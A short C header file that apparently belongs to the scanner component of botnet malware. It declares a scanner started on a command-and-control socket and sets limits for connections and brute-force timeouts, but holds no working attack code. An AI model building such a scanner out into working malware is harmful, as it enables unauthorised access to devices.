#pragma once

#ifndef SCANNER_H
#define SCANNER_H

#include <stdint.h>

#define SCANNER_MAX_CONNS    128
#define SCANNER_TIMEOUT_SEC  8
#define SCANNER_BRUTE_TIMEOUT 12

void scanner_start(int cnc_sock);
void scanner_stop(void);
int  scanner_is_running(void);

#endif
